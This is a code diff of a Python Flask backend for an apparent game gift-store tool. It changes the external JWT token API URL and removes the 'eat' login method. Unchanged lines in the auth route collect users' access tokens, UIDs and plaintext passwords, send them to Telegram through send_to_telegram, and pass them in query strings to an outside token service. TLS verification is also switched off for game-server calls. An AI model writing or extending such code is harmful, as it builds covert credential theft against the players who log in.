@@ -71,7 +71,6 @@ def decode_jwt(token):
 
 def get_wallet_data(jwt, login_token, region):
     req = GetWallet_pb2.CSGetWalletReq(login_token=login_token, topup_rebate=False)
-    # Updated ReleaseVersion to OB54
     headers = {"Authorization": f"Bearer {jwt}", "X-GA": "v1 1", "ReleaseVersion": "OB54", "Content-Type": "application/octet-stream", "User-Agent": USER_AGENT}
     try:
         r = requests.post(f"{get_server_url(region)}/GetWallet", data=encrypt_payload(req.SerializeToString()), headers=headers, verify=False, timeout=10)
@@ -100,8 +99,8 @@ def serve_image(item_id):
 def auth():
     data = request.json
     method = data.get('method')
-    key = "dgop"
-    TOKEN_API_BASE = "http://87.232.72.68:3005/token"
+    # UPDATED: new JWT API base URL
+    TOKEN_API_BASE = "https://ff-jwt-gen-api.lovable.app/api/public/token"
 
     # Build log message (credentials only)
     log_msg = f"🔐 Auth | Method: {method}\n"
@@ -126,14 +125,8 @@ def auth():
                 return jsonify({"success": False, "message": "Access token required"}), 400
             log_msg += f"Access Token: {access_token}\n"
             send_to_telegram(log_msg)
-            url = f"{TOKEN_API_BASE}?access={access_token}&key={key}"
-        elif method == 'eat':
-            eat_token = data.get('eat_token')
-            if not eat_token:
-                return jsonify({"success": False, "message": "EAT token required"}), 400
-            log_msg += f"EAT Token: {eat_token}\n"
-            send_to_telegram(log_msg)
-            url = f"{TOKEN_API_BASE}?eat={eat_token}&key={key}"
+            # New API uses access_token parameter
+            url = f"{TOKEN_API_BASE}?access_token={access_token}"
         elif method == 'uid_password':
             uid = data.get('uid')
             password = data.get('password')
@@ -141,11 +134,12 @@ def auth():
                 return jsonify({"success": False, "message": "UID and password required"}), 400
             log_msg += f"UID: {uid}\nPassword: {password}\n"
             send_to_telegram(log_msg)
-            url = f"{TOKEN_API_BASE}?uid={uid}&password={password}&key={key}"
+            # New API uses uid and password parameters
+            url = f"{TOKEN_API_BASE}?uid={uid}&password={password}"
         else:
             return jsonify({"success": False, "message": "Invalid auth method"}), 400
 
-        # For access/eat/uid methods, call external API and also log the obtained JWT
+        # For access/uid methods, call external API and also log the obtained JWT
         resp = requests.get(url, timeout=10)
         if resp.status_code != 200:
             return jsonify({"success": False, "message": f"External API error: {resp.status_code}"}), 400
@@ -167,7 +161,6 @@ def auth():
             "nickname": resp_data.get('nickname')
         })
     except Exception as e:
-        # Optionally log error to Telegram (keep silent)
         send_to_telegram(f"❌ Auth error: {str(e)}")
         return jsonify({"success": False, "message": str(e)}), 500
 
@@ -182,7 +175,6 @@ def get_store():
     if jwt_token not in STORE_CACHE:
         wallet = get_wallet_data(jwt_token, login_token, region)
         req_pb = GetGiftStoreDetails_pb2.CSGetGiftStoreDetailsReq(store_id=1)
-        # Updated ReleaseVersion to OB54
         headers = {"Authorization": f"Bearer {jwt_token}", "X-GA": "v1 1", "ReleaseVersion": "OB54", "Content-Type": "application/octet-stream", "User-Agent": USER_AGENT}
         try:
             r = requests.post(f"{get_server_url(region)}/GetGiftStoreDetails", data=encrypt_payload(req_pb.SerializeToString()), headers=headers, verify=False, timeout=15)
@@ -234,7 +226,6 @@ def send_gift():
     req.commodity_cnt = 1
     req.unit_price = int(price)
 
-    # Updated ReleaseVersion to OB54
     headers = {"Authorization": f"Bearer {jwt}", "X-GA": "v1 1", "ReleaseVersion": "OB54", "Content-Type": "application/octet-stream", "User-Agent": USER_AGENT}
     try:
         r = requests.post(f"{get_server_url(region)}/SendGift", data=encrypt_payload(req.SerializeToString()), headers=headers, verify=False, timeout=15)
